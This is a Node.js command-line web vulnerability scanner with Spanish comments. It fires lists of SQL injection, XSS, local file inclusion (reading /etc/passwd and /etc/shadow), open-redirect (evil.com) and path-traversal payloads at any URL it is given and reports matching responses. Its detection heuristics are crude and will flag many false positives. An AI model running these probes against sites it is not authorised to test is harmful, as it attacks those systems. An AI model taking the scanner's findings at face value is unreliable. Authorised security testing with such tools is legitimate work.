#!/usr/bin/env node

/**
 * Vuln Scanner Lite - MFH TOOLS PRO
 * Detector de vulnerabilidades web (SQLi, XSS, LFI, Open Redirect, Path Traversal)
 * 
 * Uso: node vuln-scanner-lite.js <url>
 * Ejemplo: node vuln-scanner-lite.js https://ejemplo.com
 * Ejemplo: node vuln-scanner-lite.js http://192.168.1.100:8080/page?id=1
 */

const https = require('https');
const http = require('http');
const url = require('url');
const fs = require('fs');

// ==================== CONFIGURACIÓN ====================
const CONFIG = {
    timeout: 5000,
    userAgent: 'MFH-VulnScanner/1.0',
    testPayloads: {
        sqli: [
            "'", "\"", 
            "1' OR '1'='1", 
            "1\" OR \"1\"=\"1", 
            "' OR 1=1--", 
            "' UNION SELECT NULL--",
            "1' AND '1'='1",
            "' OR '1'='1' --"
        ],
        xss: [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
            "\"><script>alert(1)</script>",
            "'><script>alert(1)</script>",
            "<svg/onload=alert(1)>"
        ],
        lfi: [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\win.ini",
            "../../../../etc/passwd",
            "../../../../boot.ini",
            "../../../etc/shadow",
            "..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
        ],
        openRedirect: [
            "//google.com",
            "https://google.com",
            "/\\google.com",
            "//evil.com",
            "https://evil.com"
        ],
        pathTraversal: [
            "../",
            "..\\",
            "../../",
            "..\\..\\",
            "../../../",
            "....//",
            "....\\\\"
        ]
    }
};

// ==================== PARSEAR ARGUMENTOS ====================
const args = process.argv.slice(2);
if (args.length < 1) {
    console.error(`
🔍 Vuln Scanner Lite - MFH TOOLS PRO

Uso: node vuln-scanner-lite.js <url> [opciones]

Opciones:
  --output <archivo>   Guardar reporte en archivo JSON
  --timeout <ms>       Timeout en milisegundos (default: 5000)
  --verbose            Mostrar más detalles

Ejemplos:
  node vuln-scanner-lite.js https://ejemplo.com
  node vuln-scanner-lite.js http://192.168.1.100:8080/page?id=1
  node vuln-scanner-lite.js https://target.com --output reporte.json
`);
    process.exit(1);
}

const targetUrl = args[0];
let outputFile = null;
let verbose = false;

for (let i = 1; i < args.length; i++) {
    if (args[i] === '--output' && args[i + 1]) {
        outputFile = args[i + 1];
        i++;
    } else if (args[i] === '--timeout' && args[i + 1]) {
        CONFIG.timeout = parseInt(args[i + 1]) || 5000;
        i++;
    } else if (args[i] === '--verbose') {
        verbose = true;
    }
}

// ==================== FUNCIONES HTTP ====================
function makeRequest(target, payload, paramName) {
    return new Promise((resolve) => {
        const parsedUrl = new URL(target);
        const isHttps = parsedUrl.protocol === 'https:';
        const client = isHttps ? https : http;
        
        // Construir URL con payload
        const testUrl = new URL(target);
        if (paramName) {
            testUrl.searchParams.set(paramName, payload);
        } else {
            // Si no hay parámetro, agregar como query
            testUrl.search = payload;
        }
        
        const options = {
            hostname: parsedUrl.hostname,
            port: parsedUrl.port || (isHttps ? 443 : 80),
            path: testUrl.pathname + testUrl.search,
            method: 'GET',
            timeout: CONFIG.timeout,
            headers: {
                'User-Agent': CONFIG.userAgent,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
            }
        };
        
        const startTime = Date.now();
        
        const req = client.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                resolve({
                    statusCode: res.statusCode,
                    headers: res.headers,
                    body: data.slice(0, 5000),
                    url: testUrl.toString(),
                    time: Date.now() - startTime
                });
            });
        });
        
        req.on('error', () => resolve({ error: 'Request failed' }));
        req.on('timeout', () => {
            req.destroy();
            resolve({ error: 'Timeout' });
        });
        req.end();
    });
}

// ==================== DETECTAR VULNERABILIDADES ====================
function detectVulnerabilities(response, payload, vulnType, paramName) {
    const indicators = {
        sqli: [
            'error in your sql syntax', 'mysql_fetch', 'sqlite3', 'sql error',
            'odbc', 'microsoft ole db', 'db2', 'postgresql error', 'oracle error',
            'you have an error in your sql syntax', 'warning: mysql',
            'unclosed quotation mark', 'quoted string not properly terminated',
            'sqlstate', 'database error', 'invalid query'
        ],
        xss: [
            '<script>alert(1)</script>', 'onerror=alert(1)', 
            'javascript:alert(1)', 'alert(1)', 'svg/onload'
        ],
        lfi: [
            'root:x:', 'boot.ini', '[extensions]', '; for 16-bit app support',
            'daemon:x:', 'bin:x:', 'sys:x:', 'www-data:x:', 'nobody:x:'
        ],
        openRedirect: [
            'location', 'redirect', 'href', 'window.location', 
            'http-equiv="refresh"'
        ],
        pathTraversal: [
            'No such file', 'File not found', 'Cannot find', 
            'failed to open stream', 'Unable to open', 'denied'
        ]
    };
    
    if (response.error) return false;
    
    const body = (response.body || '').toLowerCase();
    const headers = JSON.stringify(response.headers || {}).toLowerCase();
    const fullResponse = body + headers;
    
    const vulnIndicators = indicators[vulnType] || [];
    for (const indicator of vulnIndicators) {
        if (fullResponse.includes(indicator.toLowerCase())) {
            return true;
        }
    }
    
    // Verificar redirecciones para Open Redirect
    if (vulnType === 'openRedirect' && response.statusCode >= 300 && response.statusCode < 400) {
        const location = response.headers?.location || '';
        if (location.includes('google.com') || location.includes('evil.com') || location.startsWith('//')) {
            return true;
        }
    }
    
    // Verificar diferencias de longitud para SQLi
    if (vulnType === 'sqli' && response.body && response.body.length > 100) {
        // Si la respuesta es significativamente diferente, puede indicar SQLi
        if (response.body.includes('error') || response.body.includes('warning')) {
            return true;
        }
    }
    
    return false;
}

// ==================== ESCANEAR ====================
async function scan(target) {
    console.log(`🔍 Escaneando: ${target}`);
    console.log('='.repeat(60));
    
    const parsedUrl = new URL(target);
    const results = {
        target,
        timestamp: new Date().toISOString(),
        vulnerabilities: [],
        info: {},
        summary: { total: 0, detected: 0 }
    };
    
    // Obtener información básica
    console.log('📡 Obteniendo información básica...');
    const baseResponse = await makeRequest(target, '', null);
    results.info.statusCode = baseResponse.statusCode || 'Error';
    results.info.server = baseResponse.headers?.['server'] || 'Desconocido';
    results.info.contentType = baseResponse.headers?.['content-type'] || 'Desconocido';
    results.info.responseTime = baseResponse.time || 0;
    
    console.log(`   Servidor: ${results.info.server}`);
    console.log(`   Código: ${results.info.statusCode}`);
    console.log(`   Content-Type: ${results.info.contentType}`);
    console.log(`   Tiempo de respuesta: ${results.info.responseTime}ms`);
    console.log('');
    
    // Obtener parámetros de la URL
    const params = [];
    for (const [key, value] of parsedUrl.searchParams) {
        if (key && !key.startsWith('_')) {
            params.push(key);
        }
    }
    
    // Si no hay parámetros, probar con parámetros comunes
    if (params.length === 0) {
        console.log('⚠️ No se encontraron parámetros en la URL');
        console.log('   Probando con parámetros comunes...');
        params.push('id', 'page', 'q', 's', 'search', 'cat', 'prod', 'user', 'file', 'doc', 'view');
    }
    
    console.log(`📋 Parámetros a probar: ${params.join(', ')}`);
    console.log('');
    
    // Probar vulnerabilidades
    let totalTests = 0;
    let vulnDetected = 0;
    
    for (const vulnType of Object.keys(CONFIG.testPayloads)) {
        const payloads = CONFIG.testPayloads[vulnType];
        let typeDetected = false;
        
        process.stdout.write(`🔍 Probando ${vulnType.toUpperCase()}... `);
        
        for (const param of params) {
            if (typeDetected) break;
            
            for (const payload of payloads) {
                if (typeDetected) break;
                totalTests++;
                
                const response = await makeRequest(target, payload, param);
                
                if (response.error) {
                    if (verbose) console.log(`\n   ⚠️ Error en ${param} con ${payload}: ${response.error}`);
                    continue;
                }
                
                const isVulnerable = detectVulnerabilities(response, payload, vulnType, param);
                
                if (isVulnerable) {
                    results.vulnerabilities.push({
                        type: vulnType,
                        param,
                        payload,
                        url: response.url,
                        statusCode: response.statusCode,
                        responseTime: response.time
                    });
                    typeDetected = true;
                    vulnDetected++;
                    console.log(`\n   🔴 ${vulnType.toUpperCase()} detectada en ${param}`);
                    console.log(`      Payload: ${payload}`);
                    console.log(`      URL: ${response.url}`);
                }
            }
        }
        
        if (!typeDetected) {
            console.log(`✅ No detectada`);
        }
    }
    
    results.summary.total = totalTests;
    results.summary.detected = vulnDetected;
    
    // Resumen
    console.log('');
    console.log('='.repeat(60));
    console.log('📊 RESUMEN DEL ESCANEO');
    console.log('='.repeat(60));
    console.log(`🎯 Objetivo: ${target}`);
    console.log(`🔍 Pruebas realizadas: ${totalTests}`);
    console.log(`⚠️ Vulnerabilidades encontradas: ${vulnDetected}`);
    
    if (results.vulnerabilities.length > 0) {
        console.log('\n⚠️ VULNERABILIDADES DETECTADAS:');
        results.vulnerabilities.forEach((v, i) => {
            console.log(`   ${i+1}. ${v.type.toUpperCase()} en ${v.param}`);
            console.log(`      Payload: ${v.payload}`);
            console.log(`      URL: ${v.url}`);
        });
        console.log('\n🔴 Se recomienda revisar y corregir las vulnerabilidades encontradas');
    } else {
        console.log('\n✅ No se detectaron vulnerabilidades comunes');
        console.log('   (Esto no garantiza que el sitio sea completamente seguro)');
    }
    
    // Guardar reporte
    if (outputFile) {
        fs.writeFileSync(outputFile, JSON.stringify(results, null, 2));
        console.log(`\n📁 Reporte guardado en: ${outputFile}`);
    } else {
        const defaultFile = `vuln_report_${Date.now()}.json`;
        fs.writeFileSync(defaultFile, JSON.stringify(results, null, 2));
        console.log(`\n📁 Reporte guardado en: ${defaultFile}`);
    }
    
    return results;
}

// ==================== MAIN ====================
(async function main() {
    try {
        await scan(targetUrl);
    } catch (error) {
        console.error(`❌ Error: ${error.message}`);
        process.exit(1);
    }
})();
